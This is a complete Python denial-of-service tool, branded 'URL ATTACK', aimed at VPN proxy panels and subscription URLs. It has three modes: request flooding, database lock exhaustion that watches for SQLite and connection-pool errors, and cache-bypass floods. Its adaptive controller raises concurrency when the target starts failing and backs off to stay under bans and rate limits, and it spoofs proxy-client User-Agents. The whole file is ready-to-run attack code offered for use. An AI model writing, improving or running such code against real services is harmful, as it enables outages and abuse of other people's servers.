#!/usr/bin/env python3
import asyncio
import aiohttp
import random
import string
import time
import os
import sys
import json
from datetime import datetime

class Colors:
    CYAN = "\033[96m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    MAGENTA = "\033[95m"
    BLUE = "\033[94m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RESET = "\033[0m"

USER_AGENTS = [
    "v2rayN/6.23",
    "Clashmeta/1.16.0",
    "v2box/1.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Shadowrocket/1982 CFNetwork/1410.0.3 Darwin/22.6.0",
    "sing-box/1.8.0"
]

DB_ERROR_PATTERNS = [
    "database is locked", "operationalerror", "sqlite3.operationalerror",
    "sqlite_busy", "pool limit", "pooltimeout", "remaining connection slots",
    "too many connections", "lock wait timeout exceeded", "deadlock found",
    "server closed the connection unexpectedly", "peewee.operationalerror", "tortoise.exceptions"
]

CLIENT_PROFILES = [
    {"User-Agent": "Clashmeta/1.16.0", "Accept": "*/*"},
    {"User-Agent": "v2rayN/6.23", "Accept": "text/html,application/xhtml+xml"},
    {"User-Agent": "sing-box/1.8.0", "Accept": "application/json"},
    {"User-Agent": "Shadowrocket/1982 CFNetwork/1410.0.3", "Accept": "*/*"}
]

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def print_banner():
    clear_screen()
    banner = f"""
{Colors.CYAN}{Colors.BOLD}
  ██╗   ██╗██████╗ ██╗          █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗
  ██║   ██║██╔══██╗██║         ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝
  ██║   ██║██████╔╝██║         ███████║   ██║      ██║   ███████║██║     █████╔╝ 
  ██║   ██║██╔══██╗██║         ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ 
  ╚██████╔╝██║  ██║███████╗    ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗
   ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
{Colors.MAGENTA}          [ PANEL/SUB URL ATTACK ]
{Colors.DIM}          Advanced Target Extermination Framework{Colors.RESET}
"""
    print(banner)

def random_string(length=12):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def log_event(status_type: str, message: str):
    timestamp = time.strftime("%H:%M:%S")
    if status_type == "200":
        prefix = f"{Colors.GREEN}[200 OK]{Colors.RESET}"
    elif status_type == "DB_LOCKED":
        prefix = f"{Colors.RED}{Colors.BOLD}[DB-LOCKED!]{Colors.RESET}"
    elif status_type == "DB_SLOW":
        prefix = f"{Colors.YELLOW}[QUEUE-DELAY]{Colors.RESET}"
    elif status_type == "CACHE_BYPASS":
        prefix = f"{Colors.CYAN}[BYPASS-HIT]{Colors.RESET}"
    elif status_type == "429":
        prefix = f"{Colors.YELLOW}[RATE-LIMIT]{Colors.RESET}"
    elif status_type == "403":
        prefix = f"{Colors.RED}[BLOCKED/BAN]{Colors.RESET}"
    elif status_type.startswith("5"):
        prefix = f"{Colors.RED}[SRV-ERR {status_type}]{Colors.RESET}"
    elif status_type == "TIMEOUT":
        prefix = f"{Colors.RED}{Colors.BOLD}[DEADLOCK/TO]{Colors.RESET}"
    elif status_type == "HOLD":
        prefix = f"{Colors.BLUE}[CONN-HOLD]{Colors.RESET}"
    else:
        prefix = f"{Colors.RED}[FAIL/{status_type}]{Colors.RESET}"
    
    print(f"{Colors.DIM}{timestamp}{Colors.RESET} {prefix} {message}")

def save_json_report(filename_prefix: str, data: dict):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"attack_{filename_prefix}_{timestamp}.json"
    with open(filename, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)
    print(f"\n{Colors.GREEN}[✓] Battle log saved to:{Colors.RESET} {filename}")

# ---------------- Adaptive Concurrency Controller ----------------
ADJUST_INTERVAL = 20  # seconds between adjustments

async def adaptive_attack(worker_func, target_url, initial_concurrency, max_concurrency, min_concurrency, duration, stats):
    """
    worker_func: async function(session, target_url, duration, stats)
    Dynamically adjusts number of active tasks.
    """
    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        start_time = time.time()
        end_time = start_time + duration

        # Spawn initial tasks
        for _ in range(initial_concurrency):
            task = asyncio.create_task(worker_func(session, target_url, duration, stats))
            tasks.append(task)

        current_workers = initial_concurrency
        print(f"{Colors.BOLD}{Colors.BLUE}[*] Adaptive attack started with {current_workers} workers{Colors.RESET}")
        print(f"Max: {max_concurrency}, Min: {min_concurrency}, Adjust every {ADJUST_INTERVAL}s")

        prev_stats = {k: stats.get(k, 0) for k in ["requests", "success", "rate_limit", "blocked", "server_error", "timeouts", "dropped"]}

        while time.time() < end_time:
            await asyncio.sleep(ADJUST_INTERVAL)

            # Calculate deltas since last check
            new_stats = {k: stats.get(k, 0) for k in prev_stats}
            deltas = {k: new_stats[k] - prev_stats[k] for k in prev_stats}
            prev_stats = new_stats

            total_reqs = deltas["requests"]
            if total_reqs == 0:
                continue

            # Determine adjustment based on deltas
            block_rate = deltas["blocked"] / total_reqs
            limit_rate = deltas["rate_limit"] / total_reqs
            server_error_rate = deltas["server_error"] / total_reqs
            timeout_rate = deltas["timeouts"] / total_reqs
            success_rate = deltas["success"] / total_reqs

            # If banned or heavily rate-limited -> reduce concurrency
            if block_rate > 0.05 or limit_rate > 0.15:
                new_workers = max(min_concurrency, current_workers - 50)
                print(f"{Colors.YELLOW}[ADAPT] High ban/limit rate (block={block_rate:.2f}, limit={limit_rate:.2f}) -> reducing to {new_workers}{Colors.RESET}")
            # If server is throwing 5xx or timing out -> keep or slightly increase (good sign)
            elif server_error_rate > 0.1 or timeout_rate > 0.1:
                new_workers = min(max_concurrency, current_workers + 10)
                print(f"{Colors.GREEN}[ADAPT] Server struggling (5xx={server_error_rate:.2f}, TO={timeout_rate:.2f}) -> increasing to {new_workers}{Colors.RESET}")
            # If everything succeeds and no bans -> increase concurrency
            elif success_rate > 0.9 and block_rate < 0.02 and limit_rate < 0.05:
                new_workers = min(max_concurrency, current_workers + 25)
                print(f"{Colors.CYAN}[ADAPT] Success rate high ({success_rate:.2f}) -> increasing to {new_workers}{Colors.RESET}")
            else:
                new_workers = current_workers  # keep stable

            # Apply change by cancelling or spawning tasks
            if new_workers < current_workers:
                # Cancel some tasks
                cancel_count = current_workers - new_workers
                for _ in range(cancel_count):
                    if tasks:
                        t = tasks.pop()
                        t.cancel()
                print(f"  - Cancelled {cancel_count} workers")
                current_workers = new_workers
            elif new_workers > current_workers:
                # Spawn additional tasks with remaining duration
                add_count = new_workers - current_workers
                for _ in range(add_count):
                    remaining = end_time - time.time()
                    task = asyncio.create_task(worker_func(session, target_url, remaining, stats))
                    tasks.append(task)
                print(f"  + Spawned {add_count} workers")
                current_workers = new_workers

        # Wait for all remaining tasks to finish (or be cancelled)
        await asyncio.gather(*tasks, return_exceptions=True)

    total_time = time.time() - start_time
    rps = stats["requests"] / total_time if total_time > 0 else 0
    stats["duration"] = total_time
    stats["rps"] = rps
    stats["final_workers"] = current_workers
    return stats

# ---------------- Attack Workers (modified to count 403) ----------------
async def stress_worker(session, target_url, duration, stats):
    start_time = time.time()
    while time.time() - start_time < duration:
        separator = "&" if "?" in target_url else "?"
        url = f"{target_url}{separator}cache_bust={random_string(10)}"
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive"
        }
        req_start = time.perf_counter()
        try:
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=5), ssl=False) as response:
                latency = int((time.perf_counter() - req_start) * 1000)
                stats["requests"] += 1
                status = response.status
                if status == 200:
                    stats["success"] += 1
                    log_event("200", f"Target hit! Latency: {latency:>4}ms")
                elif status == 403:
                    stats["blocked"] += 1
                    log_event("403", f"Blocked by WAF/Ban! Latency: {latency}ms")
                elif status == 429:
                    stats["rate_limit"] += 1
                    log_event("429", f"Rate limit triggered. Latency: {latency}ms")
                elif 500 <= status <= 599:
                    stats["server_error"] += 1
                    log_event(str(status), f"Server bleeding internally! Latency: {latency}ms")
                else:
                    stats["other"] += 1
        except asyncio.TimeoutError:
            stats["timeouts"] += 1
            log_event("TIMEOUT", "Server drowning, timeout!")
        except Exception as e:
            stats["dropped"] += 1
        await asyncio.sleep(0.01)

async def db_stability_worker(session, target_url, duration, stats):
    start_time = time.time()
    while time.time() - start_time < duration:
        separator = "&" if "?" in target_url else "?"
        query_type = random.choice(["clash", "singbox", "sub", "b64"])
        url = f"{target_url}{separator}type={query_type}&db_audit={random_string(14)}"
        profile = random.choice(CLIENT_PROFILES)
        headers = {
            "User-Agent": profile["User-Agent"],
            "Accept": profile["Accept"],
            "Pragma": "no-cache",
            "Cache-Control": "no-cache",
            "Connection": "close"
        }
        req_start = time.perf_counter()
        try:
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=7), ssl=False) as response:
                latency = int((time.perf_counter() - req_start) * 1000)
                stats["queries_total"] += 1
                status = response.status
                if status == 200:
                    stats["queries_success"] += 1
                    if latency > 2500:
                        stats["high_latency_warning"] += 1
                        log_event("DB_SLOW", f"DB suffering! {latency}ms")
                    else:
                        stats["healthy_queries"] += 1
                elif status == 403:
                    stats["blocked"] += 1
                    log_event("403", "Blocked by WAF/Ban!")
                elif status == 429:
                    stats["rate_limited"] += 1
                    log_event("429", "Query throttled.")
                elif 500 <= status <= 599:
                    body = await response.text(errors="ignore")
                    body_lower = body.lower()
                    matched = next((p for p in DB_ERROR_PATTERNS if p in body_lower), None)
                    if matched:
                        stats["explicit_db_locks"] += 1
                        log_event("DB_LOCKED", f"Lock: {matched}")
                    else:
                        stats["server_internal_err"] += 1
                        log_event(str(status), f"Server crushed.")
        except asyncio.TimeoutError:
            stats["db_deadlock_timeouts"] += 1
            log_event("TIMEOUT", "DB deadlock!")
        except Exception as e:
            stats["dropped_connections"] += 1
        await asyncio.sleep(0)

async def cache_bypass_worker(session, target_url, duration, stats):
    start_time = time.time()
    while time.time() - start_time < duration:
        separator = "&" if "?" in target_url else "?"
        url = f"{target_url}{separator}_cache_bypass={random_string(16)}&_t={int(time.time()*1000)}"
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Cache-Control": "no-cache, no-store, must-revalidate, max-age=0",
            "Pragma": "no-cache",
            "Expires": "0",
            "X-Requested-With": "XMLHttpRequest",
            "Accept-Encoding": "identity"
        }
        req_start = time.perf_counter()
        try:
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=6), ssl=False) as response:
                latency = int((time.perf_counter() - req_start) * 1000)
                stats["requests"] += 1
                cache_headers = {k.lower(): v.lower() for k, v in response.headers.items()}
                cache_status = cache_headers.get("cf-cache-status") or cache_headers.get("x-cache") or "UNKNOWN"
                if response.status == 200:
                    stats["success"] += 1
                    if "miss" in cache_status or "bypass" in cache_status or cache_status == "UNKNOWN":
                        stats["cache_bypassed"] += 1
                        log_event("CACHE_BYPASS", f"Direct hit!")
                    else:
                        stats["cache_hits"] += 1
                elif response.status == 403:
                    stats["blocked"] += 1
                    log_event("403", "Blocked!")
                elif response.status == 429:
                    stats["rate_limit"] += 1
                elif response.status >= 500:
                    stats["origin_errors"] += 1
        except asyncio.TimeoutError:
            stats["timeouts"] += 1
        except Exception:
            stats["errors"] += 1
        await asyncio.sleep(0.01)

# ---------------- Wrapper Functions for Menu ----------------
async def run_benchmark(target_url, concurrency, duration):
    stats = {"requests":0,"success":0,"rate_limit":0,"blocked":0,"server_error":0,"timeouts":0,"dropped":0,"other":0}
    print(f"\n{Colors.BOLD}{Colors.BLUE}[*] Standard destruction engine with adaptive calibration...{Colors.RESET}")
    stats = await adaptive_attack(stress_worker, target_url, concurrency, max_concurrency=1000, min_concurrency=50, duration=duration, stats=stats)
    print(f"\n{Colors.BOLD}{Colors.CYAN}===== ANNIHILATION REPORT ====={Colors.RESET}")
    print(f" Total Battle Time:      {stats['duration']:.2f} seconds")
    print(f" Total Shots Fired:      {stats['requests']}")
    print(f" Fire Rate:              {stats['rps']:.2f} Req/Sec")
    print(f" {Colors.GREEN}Direct Hits (200):       {stats['success']}{Colors.RESET}")
    print(f" {Colors.RED}Blocks (403):            {stats.get('blocked',0)}{Colors.RESET}")
    print(f" {Colors.YELLOW}Rate Limited (429):      {stats['rate_limit']}{Colors.RESET}")
    print(f" {Colors.RED}Server Errors (5xx):     {stats['server_error']}{Colors.RESET}")
    print(f" Timeouts:                {stats['timeouts']}")
    print(f" Connection Drops:        {stats['dropped']}")
    print(f" Final Workers:           {stats.get('final_workers','?')}")
    print(f"{Colors.BOLD}{Colors.CYAN}================================{Colors.RESET}\n")
    save_json_report("standard_stress", stats)

async def run_db_lock_benchmark(target_url, concurrency, duration):
    stats = {"queries_total":0,"queries_success":0,"healthy_queries":0,"high_latency_warning":0,
             "explicit_db_locks":0,"server_internal_err":0,"db_deadlock_timeouts":0,
             "rate_limited":0,"blocked":0,"dropped_connections":0,"other_status":0,
             # also generic keys for adaptive controller
             "requests":0,"success":0,"rate_limit":0,"server_error":0,"timeouts":0,"dropped":0}
    print(f"\n{Colors.BOLD}{Colors.MAGENTA}[*] Database annihilation with adaptive calibration...{Colors.RESET}")
    stats = await adaptive_attack(db_stability_worker, target_url, concurrency, max_concurrency=800, min_concurrency=50, duration=duration, stats=stats)
    total_time = stats.get("duration", 0)
    qps = stats["queries_total"] / total_time if total_time > 0 else 0
    total_fail = stats["explicit_db_locks"] + stats["db_deadlock_timeouts"] + stats["server_internal_err"]
    resilience = 100.0 if stats["queries_total"] == 0 else max(0, ((stats["queries_total"]-total_fail)/stats["queries_total"])*100)
    print(f"\n{Colors.BOLD}{Colors.MAGENTA}===== DATABASE DESTRUCTION REPORT ====={Colors.RESET}")
    print(f" Total DB Queries:        {stats['queries_total']}")
    print(f" DB Fire Rate (QPS):      {qps:.2f}")
    print(f" {Colors.RED}DB Locks:                {stats['explicit_db_locks']}{Colors.RESET}")
    print(f" {Colors.RED}DB Deadlocks:            {stats['db_deadlock_timeouts']}{Colors.RESET}")
    print(f" Server Crashes:          {stats['server_internal_err']}")
    print(f" Blocks (403):            {stats.get('blocked',0)}")
    print(f" Rate Limited (429):      {stats['rate_limited']}")
    print(f" Target Resilience:       {Colors.BOLD}{resilience:.2f}%{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.MAGENTA}======================================{Colors.RESET}\n")
    save_json_report("db_attack", stats)

async def run_cache_bypass_audit(target_url, concurrency, duration):
    stats = {"requests":0,"success":0,"cache_bypassed":0,"cache_hits":0,
             "rate_limit":0,"blocked":0,"origin_errors":0,"timeouts":0,"errors":0}
    print(f"\n{Colors.BOLD}{Colors.CYAN}[*] Cache obliteration with adaptive calibration...{Colors.RESET}")
    stats = await adaptive_attack(cache_bypass_worker, target_url, concurrency, max_concurrency=800, min_concurrency=50, duration=duration, stats=stats)
    total_time = stats.get("duration", 0)
    bypass_rate = (stats["cache_bypassed"] / stats["requests"] * 100) if stats["requests"] > 0 else 0
    print(f"\n{Colors.BOLD}{Colors.CYAN}===== CACHE OBLITERATION REPORT ====={Colors.RESET}")
    print(f" Total Requests:          {stats['requests']}")
    print(f" Direct Hits (Bypass):    {stats['cache_bypassed']}")
    print(f" Cache Bypass Rate:       {bypass_rate:.2f}%")
    print(f" Blocks (403):            {stats.get('blocked',0)}")
    print(f" Rate Limited (429):      {stats['rate_limit']}")
    print(f" Origin Errors (5xx):     {stats['origin_errors']}")
    print(f"{Colors.BOLD}{Colors.CYAN}===================================={Colors.RESET}\n")
    save_json_report("cache_attack", stats)

def get_target_url():
    while True:
        url = input(f"{Colors.BOLD}Target Subscription URL: {Colors.RESET}").strip()
        if url.startswith("http://") or url.startswith("https://"):
            return url
        print(f"{Colors.RED}[!] Invalid URL{Colors.RESET}")

def main_menu():
    print_banner()
    print(f"{Colors.BOLD}Choose Your Weapon:{Colors.RESET}")
    print(f" [{Colors.CYAN}1{Colors.RESET}] Saturation Bombardment")
    print(f" [{Colors.MAGENTA}2{Colors.RESET}] Database Annihilation & Lock Exploitation")
    print(f" [{Colors.CYAN}3{Colors.RESET}] Cache Obliteration & Shield Piercing")
    print(f" [{Colors.RED}0{Colors.RESET}] Exit\n")

    choice = input(f"{Colors.BOLD}Choose weapon [1]: {Colors.RESET}").strip() or "1"
    if choice == "0":
        sys.exit(0)

    print(f"\n{Colors.CYAN}--- Target Configuration ---{Colors.RESET}")
    target_url = get_target_url()
    concurrency = int(input(f"{Colors.BOLD}Initial Workers [{Colors.GREEN}200{Colors.RESET}]: ").strip() or 200)
    duration = int(input(f"{Colors.BOLD}Attack Duration (seconds) [{Colors.GREEN}600{Colors.RESET}]: ").strip() or 600)

    try:
        if choice == "1":
            asyncio.run(run_benchmark(target_url, concurrency, duration))
        elif choice == "2":
            asyncio.run(run_db_lock_benchmark(target_url, concurrency, duration))
        elif choice == "3":
            asyncio.run(run_cache_bypass_audit(target_url, concurrency, duration))
        else:
            print(f"{Colors.RED}[!] Invalid choice{Colors.RESET}")
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}[!] Attack aborted. Battle log saved.{Colors.RESET}")

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print("\nProcess canceled.")
                                          
